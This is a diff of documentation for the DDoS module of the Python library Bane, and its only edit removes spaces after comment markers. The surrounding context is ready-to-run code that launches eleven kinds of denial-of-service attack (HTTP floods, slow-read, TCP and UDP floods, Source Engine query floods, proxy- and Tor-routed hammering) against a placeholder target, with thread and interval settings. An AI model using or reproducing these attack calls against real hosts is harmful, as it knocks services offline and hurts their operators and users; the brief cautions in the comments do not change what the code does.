@@ -35,7 +35,7 @@
 <pre><code>
 from bane.ddos import HTTP_Puncher
 
-# Create an instance of HTTP_Puncher
+#Create an instance of HTTP_Puncher
 ddos_attack = HTTP_Puncher(
     "https://example.com",
     send_files=True,
@@ -53,12 +53,12 @@ ddos_attack = HTTP_Puncher(
     scraped_urls=5
 )
 
-# DDoS attack is launched in the background
-# Monitor the attack's progress as needed
+#DDoS attack is launched in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set ddos_attack.stop = True
+#To stop the attack, you can set ddos_attack.stop = True
 
-# Be cautious and responsible when using DDoS attacks in a real environment.
+#Be cautious and responsible when using DDoS attacks in a real environment.
 </code></pre>
 <h1>HTTP_Spam Class</h1>
 
@@ -103,7 +103,7 @@ ddos_attack = HTTP_Puncher(
 <pre><code>
 from bane.ddos import HTTP_Spam
 
-# Create an instance of HTTP_Spam
+#Create an instance of HTTP_Spam
 http_spam = HTTP_Spam(
     "example.com",
     p=80,
@@ -127,12 +127,12 @@ http_spam = HTTP_Spam(
     logs=True
 )
 
-# HTTP spamming attack is performed in the background
-# Monitor the attack's progress as needed
+#HTTP spamming attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set http_spam.stop = True
+#To stop the attack, you can set http_spam.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 
 <h1>Proxies_Hammer Class</h1>
@@ -175,7 +175,7 @@ http_spam = HTTP_Spam(
 <pre><code>
 from bane.ddos import Proxies_Hammer
 
-# Create an instance of Proxies_Hammer
+#Create an instance of Proxies_Hammer
 proxy_hammer = Proxies_Hammer(
     "example.com",
     p=80,
@@ -196,12 +196,12 @@ proxy_hammer = Proxies_Hammer(
     logs=True
 )
 
-# Proxy hammer attack is performed in the background
-# Monitor the attack's progress as needed
+#Proxy hammer attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set proxy_hammer.stop = True
+#To stop the attack, you can set proxy_hammer.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 <h1>Proxies_HTTP_Spam Class</h1>
 
@@ -249,7 +249,7 @@ proxy_hammer = Proxies_Hammer(
 <pre><code>
 from bane.ddos import Proxies_HTTP_Spam
 
-# Create an instance of Proxies_HTTP_Spam
+#Create an instance of Proxies_HTTP_Spam
 proxy_http_spam = Proxies_HTTP_Spam(
     "example.com",
     p=80,
@@ -276,12 +276,12 @@ proxy_http_spam = Proxies_HTTP_Spam(
     logs=True
 )
 
-# Proxy HTTP spam attack is performed in the background
-# Monitor the attack's progress as needed
+#Proxy HTTP spam attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set proxy_http_spam.stop = True
+#To stop the attack, you can set proxy_http_spam.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 <h1>Proxies_Xerxes Class</h1>
 
@@ -318,7 +318,7 @@ proxy_http_spam = Proxies_HTTP_Spam(
 <pre><code>
 from bane.ddos import Proxies_Xerxes
 
-# Create an instance of Proxies_Xerxes
+#Create an instance of Proxies_Xerxes
 proxy_xerxes = Proxies_Xerxes(
     "example.com",
     scraping_timeout=15,
@@ -334,12 +334,12 @@ proxy_xerxes = Proxies_Xerxes(
     logs=True
 )
 
-# Xerxes DDoS attack is performed in the background
-# Monitor the attack's progress as needed
+#Xerxes DDoS attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set proxy_xerxes.stop = True
+#To stop the attack, you can set proxy_xerxes.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 <h1>Slow_Read Class</h1>
 
@@ -380,7 +380,7 @@ proxy_xerxes = Proxies_Xerxes(
 <pre><code>
 from bane.ddos import Slow_Read
 
-# Create an instance of Slow_Read
+#Create an instance of Slow_Read
 slow_read_attack = Slow_Read(
     "example.com",
     p=80,
@@ -400,12 +400,12 @@ slow_read_attack = Slow_Read(
     ssl_on=False
 )
 
-# Slow reading attack is performed in the background
-# Monitor the attack's progress as needed
+#Slow reading attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set slow_read_attack.stop = True
+#To stop the attack, you can set slow_read_attack.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 <h1>TCP_Flood Class</h1>
 
@@ -444,7 +444,7 @@ slow_read_attack = Slow_Read(
 <pre><code>
 from bane.ddos import TCP_Flood
 
-# Create an instance of TCP_Flood
+#Create an instance of TCP_Flood
 tcp_flood_attack = TCP_Flood(
     "example.com",
     p=80,
@@ -462,12 +462,12 @@ tcp_flood_attack = TCP_Flood(
     ssl_on=False
 )
 
-# TCP flooding attack is performed in the background
-# Monitor the attack's progress as needed
+#TCP flooding attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set tcp_flood_attack.stop = True
+#To stop the attack, you can set tcp_flood_attack.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 <h1>Tor_Hammer Class</h1>
 
@@ -506,7 +506,7 @@ tcp_flood_attack = TCP_Flood(
 <pre><code>
 from bane.ddos import Tor_Hammer
 
-# Create an instance of Tor_Hammer
+#Create an instance of Tor_Hammer
 tor_hammer_attack = Tor_Hammer(
     "example.com",
     p=80,
@@ -524,12 +524,12 @@ tor_hammer_attack = Tor_Hammer(
     paths=['/']
 )
 
-# DDoS attack is performed in the background
-# Monitor the attack's progress as needed
+#DDoS attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set tor_hammer_attack.stop = True
+#To stop the attack, you can set tor_hammer_attack.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 <h1>UDP_Flood Class</h1>
 
@@ -565,7 +565,7 @@ tor_hammer_attack = Tor_Hammer(
 <pre><code>
 from bane.ddos import UDP_Flood
 
-# Create an instance of UDP_Flood
+#Create an instance of UDP_Flood
 udp_flood_attack = UDP_Flood(
     "example.com",
     p=80,
@@ -580,12 +580,12 @@ udp_flood_attack = UDP_Flood(
     logs=False
 )
 
-# DDoS attack is performed in the background
-# Monitor the attack's progress as needed
+#DDoS attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set udp_flood_attack.stop = True
+#To stop the attack, you can set udp_flood_attack.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment.
+#Be cautious and responsible when using such attack techniques in a real environment.
 </code></pre>
 <h1>VSE_Flood Class</h1>
 
@@ -619,10 +619,10 @@ udp_flood_attack = UDP_Flood(
 <pre><code>
 from bane.ddos import VSE_Flood
 
-# Create an instance of VSE_Flood
+#Create an instance of VSE_Flood
 vse_flood_attack = VSE_Flood(
     u="example.com",
-    p=27015,  # The default port for Source Engine servers
+    p=27015,  #The default port for Source Engine servers
     threads_daemon=True,
     interval=0.001,
     connection=True,
@@ -632,12 +632,12 @@ vse_flood_attack = VSE_Flood(
     logs=False
 )
 
-# DDoS attack is performed in the background
-# Monitor the attack's progress as needed
+#DDoS attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set vse_flood_attack.stop = True
+#To stop the attack, you can set vse_flood_attack.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment, and ensure you have proper authorization.
+#Be cautious and responsible when using such attack techniques in a real environment, and ensure you have proper authorization.
 </code></pre>
 <h1>Xerxes Class</h1>
 
@@ -671,10 +671,10 @@ vse_flood_attack = VSE_Flood(
 <pre><code>
 from bane.ddos import Xerxes
 
-# Create an instance of Xerxes
+#Create an instance of Xerxes
 xerxes_attack = Xerxes(
     u="example.com",
-    p=80,  # Default HTTP port
+    p=80,  #Default HTTP port
     threads_daemon=True,
     threads=500,
     timeout=5,
@@ -684,10 +684,10 @@ xerxes_attack = Xerxes(
     ssl_on=False
 )
 
-# DDoS attack is performed in the background
-# Monitor the attack's progress as needed
+#DDoS attack is performed in the background
+#Monitor the attack's progress as needed
 
-# To stop the attack, you can set xerxes_attack.stop = True
+#To stop the attack, you can set xerxes_attack.stop = True
 
-# Be cautious and responsible when using such attack techniques in a real environment, and ensure you have proper authorization.
+#Be cautious and responsible when using such attack techniques in a real environment, and ensure you have proper authorization.
 </code></pre>
